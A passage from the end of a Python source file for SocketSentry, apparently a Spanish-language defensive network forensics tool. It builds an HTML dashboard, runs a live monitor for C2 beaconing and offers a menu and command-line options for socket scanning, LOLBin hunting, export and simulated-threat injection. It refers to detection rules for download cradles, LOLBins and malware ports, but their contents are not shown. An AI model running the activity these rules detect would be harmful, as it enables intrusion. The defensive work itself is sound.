                            <div style="font-size:0.8rem; color:#aaa;">Ingress Tool Transfer (Cradles)</div>
                        </div>
                        <span class="badge {'badge-red' if total_crit > 0 else 'badge-green'}">{'Supervisado' if total_crit > 0 else 'Normal'}</span>
                    </div>
                </div>

                <div class="panel-header" style="margin-top: 1.5rem;">
                    <h2><span>🛡️</span> Reglas Activas</h2>
                </div>
                <div style="font-size: 0.8rem; font-family: 'JetBrains Mono', monospace; color: var(--text-muted); line-height: 1.6;">
                    • Base de Datos: v{self.db.get('Version', '1.2')}<br>
                    • Reglas de Rutas: {len(self.db.get('RutasSospechosas', []))}<br>
                    • Argumentos Heurísticos: {len(self.db.get('ArgumentosSospechosos', []))}<br>
                    • Puertos de Malware Catalogados: {len(self.db.get('PuertosMalware', {}))}<br>
                    • LOLBins Monitorizados: {len(self.db.get('LOLBins', []))}
                </div>
            </div>
        </div>

        <footer>
            Generado por <a href="https://github.com/Cru9/WinAudit-DFIR" target="_blank">WinAudit-DFIR Suite / SocketSentry</a> • Autor: Cru9 • {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        </footer>
    </div>

    <script>
        document.getElementById('tableFilter').addEventListener('keyup', function() {{
            let filter = this.value.toLowerCase();
            let rows = document.querySelectorAll('#socketsTable tbody tr');
            rows.forEach(row => {{
                let text = row.innerText.toLowerCase();
                row.style.display = text.includes(filter) ? '' : 'none';
            }});
        }});
    </script>
</body>
</html>
"""
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(html_content)
        return filepath

    def live_beacon_monitor(self, interval: int = 5):
        """Monitorea el tráfico de red en bucle continuo para detectar balizas C2 (Beaconing)."""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{CYAN}{BOLD}==============================================================================")
        print("      CENTINELA DE RED EN TIEMPO REAL (LIVE BEACON & C2 SOCKET MONITOR)       ")
        print(f"==============================================================================")
        print(f"  Vigilando: Sockets TCP, Puertos Inseguros, LOLBins y Balizas Periódicas")
        print(f"  Intervalo: Cada {interval}s | [Presiona 'Ctrl+C' para detener el monitor]")
        print(f"=============================================================================={RESET}\n")

        cycle = 0
        try:
            while True:
                cycle += 1
                now_str = datetime.datetime.now().strftime("%H:%M:%S")
                self.scan_active_sockets(include_local=False)
                
                sys.stdout.write(f"\r  {CYAN}[Ciclo #{cycle}]{RESET} {now_str} | Evaluando {len(self.connections)} sockets activos... ")
                sys.stdout.flush()

                if self.suspicious_connections:
                    print(f"\n  {RED}{BOLD}[!] ALERTA DE AMENAZA DE RED:{RESET}")
                    for s in self.suspicious_connections:
                        print(f"      • PID {s['PID']} ({s['Proceso']}) -> {s['IPRemota']}:{s['PuertoRemoto']} [{s['Severidad']}]")
                        for m in s.get("Motivos", []):
                            print(f"        {YELLOW}↳ {m}{RESET}")
                    print('\a', end='')

                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[*] Centinela de red detenido por el usuario.{RESET}")


# ==============================================================================
# MENU INTERACTIVO Y CLI
# ==============================================================================
def interactive_menu():
    sentry = SocketSentry(alert_threshold=30)

    while True:
        show_banner()
        print("  Selecciona una opción de análisis forense de red:")
        print("  ────────────────────────────────────────────────────────────────────────")
        print("  [1] 🚀 Escaneo Completo de Conexiones Activas (Live Network Triage)")
        print("  [2] 🎯 Filtrar Exclusivamente Conexiones Sospechosas / Críticas")
        print("  [3] 🥷 Hunter de LOLBins y Binarios del Sistema en Red")
        print("  [4] 📡 Centinela de Red & Detector de Balizas C2 en Tiempo Real")
        print("  [5] 📊 Generar y Abrir Dashboard HTML Cyberpunk (Reporte Ejecutivo)")
        print("  [6] 💾 Exportar Evidencias Multi-formato (JSON + CSV)")
        print("  [7] 🧪 Modo Simulación Forense (Inyección de Amenazas de Prueba)")
        print("  [0] 🚪 Salir")
        print("  ────────────────────────────────────────────────────────────────────────")

        choice = input("\n  Ingrese una opción [0-7]: ").strip()

        if choice == "1":
            print(f"\n{CYAN}[*] Escaneando sockets y correlacionando procesos en memoria...{RESET}")
            sentry.scan_active_sockets()
            sentry.print_cli_summary(suspicious_only=False)
            input("\n  Presiona Enter para continuar...")

        elif choice == "2":
            print(f"\n{CYAN}[*] Analizando y filtrando conexiones sospechosas...{RESET}")
            sentry.scan_active_sockets()
            sentry.print_cli_summary(suspicious_only=True)
            input("\n  Presiona Enter para continuar...")

        elif choice == "3":
            print(f"\n{CYAN}[*] Inspeccionando actividad de LOLBins en red...{RESET}")
            sentry.scan_active_sockets()
            lolbins = [(lb.get("Nombre", "") if isinstance(lb, dict) else str(lb)).lower() for lb in sentry.db.get("LOLBins", [])]
            lb_matches = [c for c in sentry.connections if c.get("Proceso", "").lower() in lolbins]
            
            print(f"\n{CYAN}{BOLD}=== LOLBINS ACTIVOS EN RED ==={RESET}")
            if lb_matches:
                for lb in lb_matches:
                    print(f"  • PID {lb['PID']} | {lb['Proceso']} -> {lb['IPRemota']}:{lb['PuertoRemoto']} ({lb['ClasificacionIP']})")
                    if lb.get("LineaComando"):
                        print(f"    Comando: {lb['LineaComando']}")
            else:
                print(f"  {GREEN}[✓] No se detectaron LOLBins con conexiones de red activas.{RESET}")
            input("\n  Presiona Enter para continuar...")

        elif choice == "4":
            sentry.live_beacon_monitor(interval=5)
            input("\n  Presiona Enter para continuar...")

        elif choice == "5":
            if not sentry.connections:
                sentry.scan_active_sockets()
            hp = sentry.generate_html_dashboard()
            print(f"\n{GREEN}[+] Dashboard HTML generado en: {hp}{RESET}")
            try:
                os.startfile(hp)
            except Exception:
                pass
            input("\n  Presiona Enter para continuar...")

        elif choice == "6":
            if not sentry.connections:
                sentry.scan_active_sockets()
            jp = sentry.export_json()
            cp = sentry.export_csv()
            print(f"\n{GREEN}[+] Evidencias exportadas en 'Reportes/':{RESET}")
            print(f"    • JSON: {jp}")
            print(f"    • CSV:  {cp}")
            input("\n  Presiona Enter para continuar...")

        elif choice == "7":
            sentry.scan_active_sockets()
            sentry.inject_simulated_threats()
            print(f"\n{YELLOW}[!] Amenazas de prueba inyectadas (Metasploit, Cobalt Strike, Certutil).{RESET}")
            sentry.print_cli_summary(suspicious_only=True)
            input("\n  Presiona Enter para continuar...")

        elif choice == "0":
            print(f"\n{CYAN}Gracias por utilizar SocketSentry de Cru9.{RESET}\n")
            break


def main():
    if len(sys.argv) > 1:
        import argparse
        parser = argparse.ArgumentParser(description="SocketSentry | Network Socket Threat Hunter & DFIR Framework")
        parser.add_argument("--scan", action="store_true", help="Escanea sockets activos y muestra resumen")
        parser.add_argument("--suspicious-only", action="store_true", help="Filtra exclusivamente conexiones sospechosas")
        parser.add_argument("--html", action="store_true", help="Genera el Dashboard HTML interactivo")
        parser.add_argument("--json", action="store_true", help="Exporta la evidencia a JSON")
        parser.add_argument("--csv", action="store_true", help="Exporta los sockets a CSV")
        parser.add_argument("--monitor", action="store_true", help="Inicia el centinela en tiempo real")
        parser.add_argument("--simulate", action="store_true", help="Inyecta conexiones de prueba realistas")
        args = parser.parse_args()

        sentry = SocketSentry()
        if args.monitor:
            sentry.live_beacon_monitor()
            return

        sentry.scan_active_sockets()
        if args.simulate:
            sentry.inject_simulated_threats()

        if args.scan or args.suspicious_only:
            sentry.print_cli_summary(suspicious_only=args.suspicious_only)

        if args.json:
            jp = sentry.export_json()
            print(f"[+] JSON: {jp}")
        if args.csv:
            cp = sentry.export_csv()
            print(f"[+] CSV: {cp}")
        if args.html:
            hp = sentry.generate_html_dashboard()
            print(f"[+] HTML: {hp}")
        return

    interactive_menu()


if __name__ == "__main__":
    main()
